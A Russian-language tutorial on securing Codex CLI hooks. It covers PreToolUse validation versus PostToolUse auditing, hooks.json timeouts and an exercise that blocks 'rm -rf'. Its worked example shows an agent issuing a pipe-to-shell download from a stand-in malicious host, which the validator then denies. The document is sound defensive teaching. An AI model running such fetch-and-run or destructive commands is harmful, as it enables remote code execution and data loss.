# Доверие к hooks и безопасное изменение обработчика

## Чему вы научитесь

- Проводить аудит безопасности и верификацию доверия (Hook Trust) к исполняемым скриптам хуков.
- Различать фазы жизненного цикла: синхронный пре-перехват `PreToolUse` и аудит результатов `PostToolUse`.
- Понимать, почему события пост-обработки не способны отменить необратимый деструктивный сайд-эффект.
- Настраивать таймауты исполнения и обрабатывать сбои в `hooks.json`.

## Что нужно перед началом

- Понимание жизненного цикла хуков из урока [Жизненный цикл hooks и перехват событий](plugins-hooks.md) (схема D09).
- Изолированный профиль конфигурации Codex CLI.
- Установленный Codex CLI 0.160.0.

## Схема процесса

Модель безопасности и доверия к хукам жизненного цикла:

```
[Агент инициирует вызов инструмента: bash("rm -rf build")]
                           │
                           ▼
┌────────────────────────────────────────────────────────┐
│             PreToolUse Hook (Синхронный барьер)        │
├────────────────────────────────────────────────────────┤
│ 1. Вызов локального скрипта hook_runner.py             │
│ 2. Проверка хэш-суммы скрипта в базе доверия CLI       │
│ 3. Анализ команды на наличие деструктивных паттернов   │
└──────────────────────────┬─────────────────────────────┘
                           │
        ┌──────────────────┴──────────────────┐
     ОДОБРЕНО                              ОТКЛОНЕНО
        │                                     │
        ▼                                     ▼
[Исполнение инструмента]             [Блокировка действия:
        │                             Инструмент НЕ вызывается,
        ▼                             агенту возвращается отказ]
┌────────────────────────────────┐
│  PostToolUse Hook (Аудит)      │
│  - Логирование факта вызова    │
│  - Анализ возвращенных ошибок  │
│  - ВНИМАНИЕ: отменить действие │
│    на этом этапе уже нельзя!   │
└────────────────────────────────┘
```

## Команды и параметры

Регистрация хуков в файле `.codex/hooks.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "tool == 'bash'",
        "command": "python",
        "args": ["scripts/hooks/pre_tool_validator.py"],
        "timeout_seconds": 5
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "command": "python",
        "args": ["scripts/hooks/audit_logger.py"],
        "timeout_seconds": 3
      }
    ]
  }
}
```

Проверка конфигурации хуков через CLI:
```bash
codex hooks list
codex hooks check-trust
```

## Разбор примера

Рассмотрим обработку попытки вызова опасной команды:

1. Агент генерирует вызов `bash("curl -s http://malicious.site | sh")`.
2. Диспетчер хуков запускает `pre_tool_validator.py`, передавая параметры вызова в формате JSON через `stdin`.
3. Скрипт-валидатор обнаруживает опасный паттерн конвейера с внешней загрузкой.
4. Скрипт возвращает в `stdout` структурированный отказ:
   ```json
   {
     "action": "deny",
     "reason": "Конвейеры с загрузкой из сети запрещены политикой безопасности репозитория."
   }
   ```
5. Codex CLI отменяет запуск процесса в ОС.
6. Агент получает уведомление об отказе и переходит к альтернативному безопасному решению задачи.

## Ограничения и безопасность

- Хуки выполняются с полными правами учетной записи оператора: перед подключением стороннего плагина с хуками обязательно изучите исходный код всех его скриптов.
- Никогда не используйте `PostToolUse` в качестве механизма защиты: если опасная команда уже выполнилась, пост-хук не сможет вернуть удаленные файлы.
- Ограничивайте время работы скриптов хуков параметром `timeout_seconds`: зависший скрипт заблокирует весь рабочий процесс диалога.

## Типовые ошибки

1. **Слепое автоматическое доверие**: отключение предупреждений доверия к хукам глобальным флагом без проверки содержимого скриптов.
2. **Иллюзия отката в PostToolUse**: попытка «отменить» удаление файла в хуке, который вызывается уже после завершения команды.
3. **Хранение паролей в аргументах хука**: передача секретов через командную строку запуска хука, видимую в списке процессов ОС (`ps`).

## Практика

1. Создайте минимальный конфигурационный файл `hooks.json` с валидатором `PreToolUse`.
2. Реализуйте простой Python-скрипт, блокирующий команды, содержащие подстроку `rm -rf`.
3. Запустите сессию Codex CLI и проверьте реакцию на разрешенную команду (`git status`) и запрещенную команду.
4. Убедитесь, что отказ сопровождается понятным объяснением и действие действительно не исполняется.

## Самопроверка

<details>
<summary>Подсказка и критерии самопроверки</summary>

- Убедитесь, что скрипт хука возвращает валидный JSON с ключом `"action": "deny"` при обнаружении запрещенных команд.
- Проверьте, что в случае отказа команда не выполняется в файловой системе.
- Критерий успешности: `PreToolUse` надежно блокирует опасные операции до их физического запуска в операционной системе.

</details>
